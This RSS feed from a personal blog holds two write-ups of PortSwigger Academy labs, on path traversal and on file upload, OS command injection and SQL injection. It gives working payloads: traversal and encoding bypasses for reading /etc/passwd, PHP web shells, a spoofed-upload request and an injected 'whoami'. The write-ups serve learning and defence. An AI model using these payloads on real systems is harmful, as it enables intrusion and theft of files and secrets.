<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>.:: Alan Cortez</title><description>Personal Site</description><link>https://alan.com.ar/</link><language>en</language><item><title>PortSwigger Academy - Path traversal.</title><link>https://alan.com.ar/posts/portswiggeracademypathtraversal/</link><guid isPermaLink="true">https://alan.com.ar/posts/portswiggeracademypathtraversal/</guid><pubDate>Wed, 09 Jul 2025 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;https://portswigger.net/web-security/learning-paths/path-traversal&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This learning path covers path traversal vulnerabilities. You&apos;ll learn how to carry out path traversal attacks and circumvent common obstacles. You&apos;ll also learn how to prevent path traversal attacks.&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;What is path traversal?&lt;/h3&gt;
&lt;p&gt;Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. This might include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Application code and data.&lt;/li&gt;
&lt;li&gt;Credentials for back-end systems.&lt;/li&gt;
&lt;li&gt;Sensitive operating system files.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.&lt;/p&gt;
&lt;h3&gt;Reading arbitrary files via path traversal&lt;/h3&gt;
&lt;p&gt;Imagine a shopping application that displays images of items for sale. This might load an image using the following HTML:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;img src=&quot;/loadImage?filename=218.png&quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;loadImage&lt;/code&gt; URL takes a &lt;code&gt;filename&lt;/code&gt; parameter and returns the contents of the specified file. The image files are stored on disk in the location &lt;code&gt;/var/www/images/&lt;/code&gt;. To return an image, the application appends the requested filename to this base directory and uses a filesystem API to read the contents of the file. In other words, the application reads from the following file path:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/var/www/images/218.png&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This application implements no defenses against path traversal attacks. As a result, an attacker can request the following URL to retrieve the &lt;code&gt;/etc/passwd&lt;/code&gt; file from the server&apos;s filesystem:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://insecure-website.com/loadImage?filename=../../../etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This causes the application to read from the following file path:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/var/www/images/../../../etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The sequence &lt;code&gt;../&lt;/code&gt; is valid within a file path, and means to step up one level in the directory structure. The three consecutive &lt;code&gt;../&lt;/code&gt; sequences step up from &lt;code&gt;/var/www/images/&lt;/code&gt; to the filesystem root, and so the file that is actually read is:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;On Unix-based operating systems, this is a standard file containing details of the users that are registered on the server, but an attacker could retrieve other arbitrary files using the same technique.&lt;/p&gt;
&lt;p&gt;On Windows, both &lt;code&gt;../&lt;/code&gt; and &lt;code&gt;..\&lt;/code&gt; are valid directory traversal sequences. The following is an example of an equivalent attack against a Windows-based server:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;LAB: File path traversal, simple case&lt;/h4&gt;
&lt;p&gt;This lab contains a path traversal vulnerability in the display of product images. To solve the lab, retrieve the contents of the /etc/passwd file.&lt;/p&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;To solve this, I started by right-clicking an image to grab its source URL. That gave me something like:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0aaf00eb033990da81ca5247006800a9.web-security-academy.net/image?filename=8.jpg&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Then, I just kept adding ../ to the filename parameter a few times until I found the directory I was looking for.&lt;/p&gt;
&lt;p&gt;The solution ended up being:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://0aaf00eb033990da81ca5247006800a9.web-security-academy.net/image?filename=../../../etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;Common obstacles to exploiting path traversal vulnerabilities&lt;/h3&gt;
&lt;p&gt;Many applications that place user input into file paths implement defenses against path traversal attacks. These can often be bypassed.&lt;/p&gt;
&lt;p&gt;If an application strips or blocks directory traversal sequences from the user-supplied filename, it might be possible to bypass the defense using a variety of techniques.&lt;/p&gt;
&lt;p&gt;You might be able to use an absolute path from the filesystem root, such as &lt;code&gt;filename=/etc/passwd&lt;/code&gt;, to directly reference a file without using any traversal sequences.&lt;/p&gt;
&lt;h4&gt;Lab: File path traversal, traversal sequences blocked with absolute path bypass&lt;/h4&gt;
&lt;p&gt;This lab contains a path traversal vulnerability in the display of product images.&lt;/p&gt;
&lt;p&gt;The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.&lt;/p&gt;
&lt;p&gt;To solve the lab, retrieve the contents of the &lt;code&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;We intercept the request&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /image?filename=5.jpg HTTP/2
Host: 0aa500d104625ca68276601f00de0098.web-security-academy.net
Cookie: session=GvEnpHbu8HvC87C9631Fuv2PbCXDjwyX
Sec-Ch-Ua-Platform: &quot;Windows&quot;
Accept-Language: en-GB,en;q=0.9
Sec-Ch-Ua: &quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0aa500d104625ca68276601f00de0098.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: i`
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;and change&lt;br /&gt;
&lt;code&gt;GET /image?filename=5.jpg&lt;/code&gt;&lt;br /&gt;
for&lt;br /&gt;
&lt;code&gt;GET /image?filename=/etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;Common obstacles to exploiting path traversal vulnerabilities - Continued&lt;/h3&gt;
&lt;p&gt;You might be able to use nested traversal sequences, such as &lt;code&gt;....//&lt;/code&gt; or &lt;code&gt;....\/&lt;/code&gt;. These revert to simple traversal sequences when the inner sequence is stripped.&lt;/p&gt;
&lt;h4&gt;Lab: File path traversal, traversal sequences stripped non-recursively&lt;/h4&gt;
&lt;p&gt;This lab contains a path traversal vulnerability in the display of product images.&lt;/p&gt;
&lt;p&gt;The application strips path traversal sequences from the user-supplied filename before using it.&lt;/p&gt;
&lt;p&gt;To solve the lab, retrieve the contents of the &lt;code&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;Since the lab strips path traversal sequences, using:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /image?filename=../../../etc/passwd HTTP/2
Host: 0a78008203c6729a829a255500bd0024.web-security-academy.net
Cookie: session=RoX9uyjy6phuxm1jfFK3AksmsDJ5GQAg
Sec-Ch-Ua-Platform: &quot;Windows&quot;
Accept-Language: en-GB,en;q=0.9
Sec-Ch-Ua: &quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a78008203c6729a829a255500bd0024.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=2, i`
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;gets us:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14
&quot;No such file&quot;`
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;What we can do is replace&lt;br /&gt;
&lt;code&gt;GET /image?filename=../../../etc/passwd HTTP/2&lt;/code&gt;&lt;br /&gt;
for&lt;br /&gt;
&lt;code&gt;GET /image?filename=....//....//....//etc/passwd HTTP/2&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;Common obstacles to exploiting path traversal vulnerabilities - Continued&lt;/h3&gt;
&lt;p&gt;In some contexts, such as in a URL path or the &lt;code&gt;filename&lt;/code&gt; parameter of a &lt;code&gt;multipart/form-data&lt;/code&gt; request, web servers may strip any directory traversal sequences before passing your input to the application. You can sometimes bypass this kind of sanitization by URL encoding, or even double URL encoding, the &lt;code&gt;../&lt;/code&gt; characters. This results in &lt;code&gt;%2e%2e%2f&lt;/code&gt; and &lt;code&gt;%252e%252e%252f&lt;/code&gt; respectively. Various non-standard encodings, such as &lt;code&gt;..%c0%af&lt;/code&gt; or &lt;code&gt;..%ef%bc%8f&lt;/code&gt;, may also work.&lt;/p&gt;
&lt;h4&gt;Lab: File path traversal, traversal sequences stripped with superfluous URL-decode&lt;/h4&gt;
&lt;p&gt;This lab contains a path traversal vulnerability in the display of product images.&lt;/p&gt;
&lt;p&gt;The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.&lt;/p&gt;
&lt;p&gt;To solve the lab, retrieve the contents of the &lt;code&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;At first I tried:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GET /image?filename=../../../etc/passwd HTTP/2&lt;/code&gt;&lt;br /&gt;
and&lt;br /&gt;
&lt;code&gt;GET /image?filename=....//....//....//etc/passwd HTTP/2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;But we got&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14
&quot;No such file&quot;`
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Instead we double encode the ../ part:&lt;br /&gt;
&lt;code&gt;../&lt;/code&gt; --&amp;gt; &lt;code&gt;%2e%2e%2f&lt;/code&gt; --&amp;gt; &lt;code&gt;%252e%252e%252f&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/2&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;Common obstacles to exploiting path traversal vulnerabilities - Continued&lt;/h3&gt;
&lt;p&gt;An application may require the user-supplied filename to start with the expected base folder, such as &lt;code&gt;/var/www/images&lt;/code&gt;. In this case, it might be possible to include the required base folder followed by suitable traversal sequences. For example: &lt;code&gt;filename=/var/www/images/../../../etc/passwd&lt;/code&gt;.&lt;/p&gt;
&lt;h4&gt;Lab: File path traversal, validation of start of path&lt;/h4&gt;
&lt;p&gt;This lab contains a path traversal vulnerability in the display of product images.&lt;/p&gt;
&lt;p&gt;The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.&lt;/p&gt;
&lt;p&gt;To solve the lab, retrieve the contents of the &lt;code&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;We replace&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GET /image?filename=/var/www/images/47.jpg HTTP/2&lt;/code&gt;&lt;br /&gt;
for&lt;br /&gt;
&lt;code&gt;GET /image?filename=/var/www/images/../../../etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;Common obstacles to exploiting path traversal vulnerabilities - Continued&lt;/h3&gt;
&lt;p&gt;An application may require the user-supplied filename to end with an expected file extension, such as &lt;code&gt;.png&lt;/code&gt;. In this case, it might be possible to use a null byte to effectively terminate the file path before the required extension. For example: &lt;code&gt;filename=../../../etc/passwd%00.png&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Lab: File path traversal, validation of file extension with null byte bypass&lt;/h3&gt;
&lt;p&gt;This lab contains a path traversal vulnerability in the display of product images.&lt;/p&gt;
&lt;p&gt;The application validates that the supplied filename ends with the expected file extension.&lt;/p&gt;
&lt;p&gt;To solve the lab, retrieve the contents of the &lt;code&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;We use the null byte trick:
&lt;code&gt;filename=../../../etc/passwd%00.png&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;How to prevent a path traversal attack&lt;/h3&gt;
&lt;p&gt;The most effective way to prevent path traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether. Many application functions that do this can be rewritten to deliver the same behavior in a safer way.&lt;/p&gt;
&lt;p&gt;If you can&apos;t avoid passing user-supplied input to filesystem APIs, we recommend using two layers of defense to prevent attacks:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Validate the user input before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn&apos;t possible, verify that the input contains only permitted content, such as alphanumeric characters only.&lt;/li&gt;
&lt;li&gt;After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Below is an example of some simple Java code to validate the canonical path of a file based on user input:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;File file = new File(BASE_DIRECTORY, userInput); if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) { // process file }&lt;/code&gt;&lt;/p&gt;
</content:encoded></item><item><title>PortSwigger Academy - Server-side vulnerabilities (Part 2).</title><link>https://alan.com.ar/posts/portswiggeracademyp2/</link><guid isPermaLink="true">https://alan.com.ar/posts/portswiggeracademyp2/</guid><pubDate>Wed, 02 Jul 2025 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This learning path introduces you to a range of common server-side vulnerabilities. This is perfect if you&apos;re new to web security and want to get an overview of the kinds of vulnerabilities that exist, as well as how an attacker might identify and exploit them in real-world systems.&lt;/p&gt;
&lt;h2&gt;Attacks:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Path traversal (Part 1)&lt;/li&gt;
&lt;li&gt;Access control (Part 1)&lt;/li&gt;
&lt;li&gt;Authentication (Part 1)&lt;/li&gt;
&lt;li&gt;Server-side request forgery (SSRF) (Part 1)&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/posts/portswiggeracademyp2/#file-upload-vulnerabilities&quot;&gt;File upload vulnerabilities&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/posts/portswiggeracademyp2/#os-command-injection&quot;&gt;OS command injection&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/posts/portswiggeracademyp2/#sql-injection&quot;&gt;SQL injection&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Go to &lt;a href=&quot;/posts/portswiggeracademyp1/&quot;&gt;part 1&lt;/a&gt;.&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;File upload vulnerabilities&lt;/h3&gt;
&lt;p&gt;File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.&lt;/p&gt;
&lt;p&gt;In some cases, the act of uploading the file is in itself enough to cause damage. Other attacks may involve a follow-up HTTP request for the file, typically to trigger its execution by the server.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;How do file upload vulnerabilities arise?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Given the fairly obvious dangers, it&apos;s rare for websites in the wild to have no restrictions whatsoever on which files users are allowed to upload. More commonly, developers implement what they believe to be robust validation that is either inherently flawed or can be easily bypassed.&lt;/p&gt;
&lt;p&gt;For example, they may attempt to blacklist dangerous file types, but fail to account for parsing discrepancies when checking the file extensions. As with any blacklist, it&apos;s also easy to accidentally omit more obscure file types that may still be dangerous.&lt;/p&gt;
&lt;p&gt;In other cases, the website may attempt to check the file type by verifying properties that can be easily manipulated by an attacker using tools like Burp Proxy or Repeater.&lt;/p&gt;
&lt;p&gt;Ultimately, even robust validation measures may be applied inconsistently across the network of hosts and directories that form the website, resulting in discrepancies that can be exploited.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Exploiting unrestricted file uploads to deploy a web shell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;From a security perspective, the worst possible scenario is when a website allows you to upload server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code. This makes it trivial to create your own web shell on the server.
Web shell&lt;/p&gt;
&lt;p&gt;A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.&lt;/p&gt;
&lt;p&gt;If you&apos;re able to successfully upload a web shell, you effectively have full control over the server. This means you can read and write arbitrary files, exfiltrate sensitive data, even use the server to pivot attacks against both internal infrastructure and other servers outside the network. For example, the following PHP one-liner could be used to read arbitrary files from the server&apos;s filesystem:
&amp;lt;?php echo file_get_contents(&apos;/path/to/target/file&apos;); ?&amp;gt;&lt;/p&gt;
&lt;p&gt;Once uploaded, sending a request for this malicious file will return the target file&apos;s contents in the response.&lt;/p&gt;
&lt;p&gt;A more versatile web shell may look something like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php echo system($_GET[&apos;command&apos;]); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This script enables you to pass an arbitrary system command via a query parameter as follows:
GET /example/exploit.php?command=id HTTP/1.1&lt;/p&gt;
&lt;h4&gt;Lab: Remote code execution via web shell upload&lt;/h4&gt;
&lt;p&gt;To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.&lt;/p&gt;
&lt;h4&gt;Solution:&lt;/h4&gt;
&lt;p&gt;We upload the attack.php file&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php echo file_get_contents(&apos;/home/carlos/secret&apos;); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;and then run the request via Repeater&lt;/p&gt;
&lt;p&gt;GET /files/avatars/attack3.php?command=&quot;/home/carlos/secret&quot; HTTP/2
Host: 0a26003f0431becf835ad24600a5009b.web-security-academy.net&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Exploiting flawed validation of file uploads&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In the wild, it&apos;s unlikely that you&apos;ll find a website that has no protection against file upload attacks like we saw in the previous lab. But just because defenses are in place, that doesn&apos;t mean that they&apos;re robust. You can sometimes still exploit flaws in these mechanisms to obtain a web shell for remote code execution.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Flawed file type validation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;When submitting HTML forms, the browser typically sends the provided data in a POST request with the content type application/x-www-form-url-encoded. This is fine for sending simple text like your name or address. However, it isn&apos;t suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type multipart/form-data is preferred.&lt;/p&gt;
&lt;p&gt;Consider a form containing fields for uploading an image, providing a description of it, and entering your username. Submitting such a form might result in a request that looks something like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /images HTTP/1.1
    Host: normal-website.com
    Content-Length: 12345
    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;example.jpg&quot;
    Content-Type: image/jpeg

    [...binary content of example.jpg...]

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name=&quot;description&quot;

    This is an interesting description of my image.

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name=&quot;username&quot;

    wiener
    ---------------------------012345678901234567890123456--
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As you can see, the message body is split into separate parts for each of the form&apos;s inputs. Each part contains a Content-Disposition header, which provides some basic information about the input field it relates to. These individual parts may also contain their own Content-Type header, which tells the server the MIME type of the data that was submitted using this input.&lt;/p&gt;
&lt;p&gt;One way that websites may attempt to validate file uploads is to check that this input-specific Content-Type header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like image/jpeg and image/png. Problems can arise when the value of this header is implicitly trusted by the server. If no further validation is performed to check whether the contents of the file actually match the supposed MIME type, this defense can be easily bypassed using tools like Burp Repeater&lt;/p&gt;
&lt;h4&gt;Lab: Web shell upload via Content-Type restriction bypass&lt;/h4&gt;
&lt;p&gt;This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.&lt;/p&gt;
&lt;p&gt;To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.&lt;/p&gt;
&lt;p&gt;You can log in to your own account using the following credentials: wiener:peter&lt;/p&gt;
&lt;h4&gt;Solution:&lt;/h4&gt;
&lt;p&gt;We use Proxy - Intercept to change the Content-type in the POST Request:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /my-account/avatar HTTP/2
Host: 0ae2004e03d0a1f28068d1a3008200d4.web-security-academy.net
Cookie: session=jcm7qKNEgFQupC6hZXOPPIlj0Zh2YZwA
Content-Length: 476
Cache-Control: max-age=0
Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;137&quot;, &quot;Not/A)Brand&quot;;v=&quot;24&quot;
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: &quot;Windows&quot;
Accept-Language: en-GB,en;q=0.9
Origin: https://0ae2004e03d0a1f28068d1a3008200d4.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyz3OAX1tBtwOepXm
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae2004e03d0a1f28068d1a3008200d4.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

------WebKitFormBoundaryyz3OAX1tBtwOepXm
Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;attack3.php&quot;
Content-Type: application/octet-stream &amp;lt;---- HERE we change application/octet-stream for image/jpeg

&amp;lt;?php echo file_get_contents(&apos;/home/carlos/secret&apos;); ?&amp;gt;
------WebKitFormBoundaryyz3OAX1tBtwOepXm
Content-Disposition: form-data; name=&quot;user&quot;

wiener
------WebKitFormBoundaryyz3OAX1tBtwOepXm
Content-Disposition: form-data; name=&quot;csrf&quot;

jjC5q5LOPJlMhwRQpY0f7usmbCOv5fsH
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;OS command injection&lt;/h3&gt;
&lt;p&gt;OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data. Often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, and exploit trust relationships to pivot the attack to other systems within the organization.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Useful commands&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;After you identify an OS command injection vulnerability, it&apos;s useful to execute some initial commands to obtain information about the system. Below is a summary of some commands that are useful on Linux and Windows platforms:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Purpose of command&lt;/th&gt;
&lt;th&gt;Linux&lt;/th&gt;
&lt;th&gt;Windows&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Name of current user&lt;/td&gt;
&lt;td&gt;whoami&lt;/td&gt;
&lt;td&gt;whoami&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Operating system&lt;/td&gt;
&lt;td&gt;uname -a&lt;/td&gt;
&lt;td&gt;ver&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Network configuration&lt;/td&gt;
&lt;td&gt;ifconfig&lt;/td&gt;
&lt;td&gt;ipconfig /all&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Network connections&lt;/td&gt;
&lt;td&gt;netstat -an&lt;/td&gt;
&lt;td&gt;netstat -an&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Running processes&lt;/td&gt;
&lt;td&gt;ps -ef&lt;/td&gt;
&lt;td&gt;tasklist&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;Injecting OS commands&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In this example, a shopping application lets the user view whether an item is in stock in a particular store. This information is accessed via a URL:
https://insecure-website.com/stockStatus?productID=381&amp;amp;storeID=29&lt;/p&gt;
&lt;p&gt;To provide the stock information, the application must query various legacy systems. For historical reasons, the functionality is implemented by calling out to a shell command with the product and store IDs as arguments:
stockreport.pl 381 29&lt;/p&gt;
&lt;p&gt;This command outputs the stock status for the specified item, which is returned to the user.&lt;/p&gt;
&lt;p&gt;The application implements no defenses against OS command injection, so an attacker can submit the following input to execute an arbitrary command:
&amp;amp; echo aiwefwlguh &amp;amp;&lt;/p&gt;
&lt;p&gt;If this input is submitted in the productID parameter, the command executed by the application is:
stockreport.pl &amp;amp; echo aiwefwlguh &amp;amp; 29&lt;/p&gt;
&lt;p&gt;The echo command causes the supplied string to be echoed in the output. This is a useful way to test for some types of OS command injection. The &amp;amp; character is a shell command separator. In this example, it causes three separate commands to execute, one after another. The output returned to the user is:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Error - productID was not provided
aiwefwlguh
29: command not found
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The three lines of output demonstrate that:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;The original stockreport.pl command was executed without its expected arguments, and so returned an error message.
The injected echo command was executed, and the supplied string was echoed in the output.
The original argument 29 was executed as a command, which caused an error.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Placing the additional command separator &amp;amp; after the injected command is useful because it separates the injected command from whatever follows the injection point. This reduces the chance that what follows will prevent the injected command from executing.&lt;/p&gt;
&lt;h4&gt;Lab: OS command injection, simple case&lt;/h4&gt;
&lt;p&gt;This lab contains an OS command injection vulnerability in the product stock checker.&lt;/p&gt;
&lt;p&gt;The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.&lt;/p&gt;
&lt;p&gt;To solve the lab, execute the whoami command to determine the name of the current user.&lt;/p&gt;
&lt;h4&gt;Solution:&lt;/h4&gt;
&lt;p&gt;we grab the request and change
productId=3&amp;amp;storeId=2&lt;/p&gt;
&lt;p&gt;for&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;productId=3&amp;amp;storeId=2|whoami
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The pipe operator | allows you to chain commands together. It takes the standard output (stdout) of the command on its left and redirects it as the standard input (stdin) of the command on its right.&lt;/p&gt;
&lt;h3&gt;SQL injection&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;What is SQL injection (SQLi)?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application&apos;s content or behavior.&lt;/p&gt;
&lt;p&gt;In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;How to detect SQL injection vulnerabilities&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;You can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:&lt;/p&gt;
&lt;p&gt;The single quote character &apos; and look for errors or other anomalies.
Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application&apos;s responses.
Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.&lt;/p&gt;
&lt;p&gt;Alternatively, you can find the majority of SQL injection vulnerabilities quickly and reliably using Burp Scanner.&lt;/p&gt;
